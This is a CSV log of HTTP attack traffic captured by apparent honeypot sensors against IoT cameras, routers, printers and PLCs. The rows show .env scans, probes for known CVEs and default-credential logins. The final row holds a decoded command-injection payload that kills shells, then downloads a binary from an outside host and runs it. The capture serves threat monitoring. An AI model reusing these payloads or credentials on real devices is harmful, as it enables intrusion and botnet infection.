local_ip,remote_ip,remote_port,local_port,tag_label,attack_time,target_profile,node_id,ASN,attack_data,method,path,User-Agent,Accept-Encoding,Accept,Qualys-Scan,Content-Length,Content-Type,Referrer,Host,body
203.190.133.71,78.153.140.221,49400,80,Unsecured_ENV_file_scan,2023-11-04T15:42:04,device:iot:IPCamera:AMCREST,61,AS202306,"{'method': 'GET', 'path': '/.env', 'headers': {'Host': '203.190.133.71', 'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}}",GET,/.env,,"gzip, deflate",*/*,,,,,203.190.133.71,
10.6.1.9,62.133.60.107,33542,80,CVE-2020-8958,2023-11-04T15:28:35,device:iot:IPCamera:AXIS-IPCamera,406,AS207713,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '103.138.197.94:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://103.138.197.94:80', 'Connection': 'keep-alive', 'Referer': 'http://103.138.197.94:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,103.138.197.94:80,username=admin&psd=Feefifofum
103.194.24.32,212.192.14.201,41646,80,CID-937,2023-11-04T16:02:28,device:iot:IPCamera:D-Link-DCS-5222L,255,AS207713,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '103.194.24.32:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 103.194.24.32:80/menu.html', 'Authorization': 'Basic YWRtaW46MTIzNDU2'}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,103.194.24.32:80,
203.190.133.87,212.192.14.201,46904,80,CID-937,2023-11-04T16:15:35,device:iot:Router:Cisco,61,AS207713,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '203.190.133.87:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 203.190.133.87:80/menu.html', 'Authorization': 'Basic YWRtaW46emhvbmU='}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,203.190.133.87:80,
203.190.133.87,212.192.14.201,46904,80,CID-937,2023-11-04T16:15:35,device:iot:Router:Cisco,61,AS207713,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '203.190.133.87:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 203.190.133.87:80/menu.html', 'Authorization': 'Basic YWRtaW5pc3A6YWRtaW5pc3A='}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,203.190.133.87:80,
164.100.127.147,212.192.14.201,54916,80,CID-937,2023-11-04T16:08:05,device:iot:Router:Cisco,472,AS207713,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '164.100.127.147:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 164.100.127.147:80/menu.html', 'Authorization': 'Basic YWRtaW46cGFzc3dvcmQxMjM='}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,164.100.127.147:80,
103.217.118.124,43.140.203.33,57576,80,CID-951,2023-11-04T16:42:21,device:iot:Printer:Epson,112,AS45090,"{'method': 'GET', 'path': '/phpmyadmin/index.php', 'headers': {'Connection': 'Keep-Alive', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6,ko;q=0.4', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36', 'Host': '103.217.118.124'}}",GET,/phpmyadmin/index.php,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36",,"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",,,,,103.217.118.124,
219.65.97.28,45.156.129.12,34380,80,CVE-2019-18935,2023-11-04T17:11:30,device:iot:Printer:Canon,391,AS211680,"{'method': 'GET', 'path': '/Telerik.Web.UI.WebResource.axd?type=rau', 'headers': {'Host': '219.65.97.28', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 ', 'Accept': '*/*', 'Accept-Encoding': 'gzip'}}",GET,/Telerik.Web.UI.WebResource.axd?type=rau,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 ",gzip,*/*,,,,,219.65.97.28,
103.118.160.218,212.192.14.201,55732,80,CID-937,2023-11-04T16:15:52,device:iot:Router:Cisco,72,AS207713,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '103.118.160.218:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 103.118.160.218:80/menu.html', 'Authorization': 'Basic cm9vdDo='}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,103.118.160.218:80,
172.25.99.181,8.222.187.144,57514,80,Unsecured_ENV_file_scan,2023-11-04T17:21:35,device:scada:plc:Delta_Electronics,516,AS45102,"{'method': 'GET', 'path': '/new/.env', 'headers': {'Host': '103.163.243.107', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36', 'Accept-Encoding': 'gzip, deflate    ', 'Accept': '*/*', 'Connection': 'keep-alive'}}",GET,/new/.env,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36","gzip, deflate    ",*/*,,,,,103.163.243.107,
172.25.99.181,8.222.187.144,57287,80,Unsecured_ENV_file_scan,2023-11-04T17:21:35,device:scada:plc:Delta_Electronics,516,AS45102,"{'method': 'GET', 'path': '/new/.env', 'headers': {'Host': '103.163.243.107', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36', 'Accept-Encoding': 'gzip, deflate    ', 'Accept': '*/*', 'Connection': 'keep-alive'}}",GET,/new/.env,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36","gzip, deflate    ",*/*,,,,,103.163.243.107,
192.168.30.182,103.75.173.27,42759,80,CID-1277,2023-11-04T19:06:52,device:iot:Router:Cisco,482,AS27385,"{'method': 'GET', 'path': '/mailform/form.html', 'headers': {'Host': '103.87.41.57', 'Connection': 'Keep-Alive', 'Qualys-Scan': 'VM'}}",GET,/mailform/form.html,,,,VM,,,,103.87.41.57,
117.255.218.88,69.10.61.58,38358,80,CVE-2020-8958,2023-11-04T21:40:51,device:scada:plc:Delta_Electronics,150,AS19318,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '117.255.218.88:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://117.255.218.88:80', 'Connection': 'keep-alive', 'Referer': 'http://117.255.218.88:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,117.255.218.88:80,username=admin&psd=Feefifofum
223.31.122.235,45.128.232.152,55488,8080,CID-1193,2023-11-04T21:16:30,device:web:server:Apache,154,AS202685,"{'method': 'CONNECT', 'path': 'google.com:443', 'headers': {'Host': 'google.com:443', 'User-Agent': 'Go-http-client/1.1'}}",CONNECT,google.com:443,Go-http-client/1.1,,,,,,,google.com:443,
103.194.24.36,62.133.60.88,42372,80,CVE-2020-8958,2023-11-04T21:50:13,device:iot:Router:TP-LINK,255,AS207713,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '103.194.24.36:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://103.194.24.36:80', 'Connection': 'keep-alive', 'Referer': 'http://103.194.24.36:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,103.194.24.36:80,username=admin&psd=Feefifofum
164.100.138.188,149.50.96.22,60864,80,CVE-2020-8958,2023-11-01T06:51:01,device:iot:Router:MikroTik,218,AS201814,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '164.100.138.188:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://164.100.138.188:80', 'Connection': 'keep-alive', 'Referer': 'http://164.100.138.188:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,164.100.138.188:80,username=admin&psd=Feefifofum
202.59.244.132,149.50.96.22,60346,80,CVE-2020-8958,2023-11-01T06:51:05,device:iot:IPCamera:CISCO-WebCam,136,AS201814,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '202.59.244.132:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://202.59.244.132:80', 'Connection': 'keep-alive', 'Referer': 'http://202.59.244.132:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,202.59.244.132:80,username=admin&psd=Feefifofum
182.79.70.176,40.86.241.28,57946,80,Unsecured_ENV_file_scan,2023-11-01T06:34:37,device:iot:IPCamera:CISCO-WebCam,111,AS8075,"{'method': 'GET', 'path': '/library/.env', 'headers': {'Host': '182.79.70.176', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}}",GET,/library/.env,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36","gzip, deflate",*/*,,,,,182.79.70.176,
210.212.14.164,207.102.138.19,58208,80,CID-1014,2023-11-01T06:39:46,device:iot:IPCamera:Panasonic,491,AS852,"{'method': 'GET', 'path': '/custom_lang/English.txt', 'headers': {'Host': '210.212.14.164', 'Connection': 'keep-alive', 'Accept': 'application/json', 'X-Requested-With': 'XMLHttpRequest', 'X-Request': 'JSON', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', 'Referer': 'http://210.212.14.164/', 'Accept-Encoding': 'gzip, deflate', 'Cookie': 'PrvLangCookie30=%2Fweb_lang%2FEnglish.txt'}}",GET,/custom_lang/English.txt,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36","gzip, deflate",application/json,,,,,210.212.14.164,
210.212.14.164,204.101.161.19,58288,80,CID-1112,2023-11-01T06:39:48,device:iot:IPCamera:Panasonic,491,AS577,"{'method': 'GET', 'path': '/custom_logo/logo.jpg', 'headers': {'Host': '210.212.14.164', 'Connection': 'keep-alive', 'Accept': '*/*', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', 'Referer': 'http://210.212.14.164/', 'Accept-Encoding': 'gzip, deflate', 'Cookie': 'PrvLangCookie30=%2Fweb_lang%2FEnglish.txt'}}",GET,/custom_logo/logo.jpg,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36","gzip, deflate",*/*,,,,,210.212.14.164,
27.34.251.38,80.82.77.202,55077,8080,CID-1091,2023-11-01T06:37:53,device:web:server:Apache,421,AS202425,"{'method': 'GET', 'path': '/aab9', 'headers': {'Host': '27.34.251.38:8080', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/aab9,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",gzip,,,,,,27.34.251.38:8080,
103.30.64.117,149.50.96.22,36944,80,CVE-2020-8958,2023-11-01T06:51:36,device:iot:Printer:Canon,414,AS201814,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '103.30.64.117:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://103.30.64.117:80', 'Connection': 'keep-alive', 'Referer': 'http://103.30.64.117:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,103.30.64.117:80,username=admin&psd=Feefifofum
103.217.118.124,149.50.96.22,51290,80,CVE-2020-8958,2023-11-01T06:51:14,device:iot:Printer:Epson,112,AS201814,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '103.217.118.124:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://103.217.118.124:80', 'Connection': 'keep-alive', 'Referer': 'http://103.217.118.124:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,103.217.118.124:80,username=admin&psd=Feefifofum
117.239.112.241,83.97.73.87,49568,80,CVE-2022-22947,2023-11-01T06:36:39,device:iot:Printer:Epson,261,AS208312,"{'method': 'GET', 'path': '/actuator/gateway/routes', 'headers': {'Host': '117.239.112.241:80', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/actuator/gateway/routes,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",gzip,,,,,,117.239.112.241:80,
103.118.160.218,109.237.97.180,56064,80,Unsecured_ENV_file_scan,2023-11-01T05:56:24,device:iot:Router:Cisco,72,AS202306,"{'method': 'GET', 'path': '/.env', 'headers': {'Host': '103.118.160.218', 'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}}",GET,/.env,,"gzip, deflate",*/*,,,,,103.118.160.218,
59.145.139.184,45.95.147.204,37152,80,CVE-2020-8958,2023-11-01T06:18:25,device:iot:IPCamera:Hikvision,250,AS49870,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '59.145.139.184:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://59.145.139.184:80', 'Connection': 'keep-alive', 'Referer': 'http://59.145.139.184:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,59.145.139.184:80,username=admin&psd=Feefifofum
115.112.55.62,149.50.96.22,33186,80,CVE-2020-8958,2023-11-01T06:52:29,device:iot:IPCamera:CISCO-WebCam,170,AS201814,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '115.112.55.62:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://115.112.55.62:80', 'Connection': 'keep-alive', 'Referer': 'http://115.112.55.62:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,115.112.55.62:80,username=admin&psd=Feefifofum
103.144.216.22,149.50.96.22,41528,80,CVE-2020-8958,2023-11-01T06:51:20,device:iot:IPCamera:Avtech,178,AS201814,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '103.144.216.22:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://103.144.216.22:80', 'Connection': 'keep-alive', 'Referer': 'http://103.144.216.22:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,103.144.216.22:80,username=admin&psd=Feefifofum
10.96.153.65,199.45.155.17,58272,80,CID-982,2023-11-01T07:03:50,device:iot:Printer:Canon,370,AS398722,"{'method': 'GET', 'path': '/favicon.ico', 'headers': {'Host': '103.129.75.240', 'User-Agent': 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/favicon.ico,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),gzip,,,,,,103.129.75.240,
223.31.120.76,83.97.73.87,40200,80,CVE-2022-22947,2023-11-01T06:22:17,device:iot:IPCamera:CISCO-WebCam,143,AS208312,"{'method': 'GET', 'path': '/actuator/gateway/routes', 'headers': {'Host': '223.31.120.76:80', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/actuator/gateway/routes,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",gzip,,,,,,223.31.120.76:80,
172.16.16.109,89.190.156.170,36940,8080,CVE-2023-26801,2023-11-01T07:20:31,device:web:server:Apache,433,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '103.58.121.109:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,103.58.121.109:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
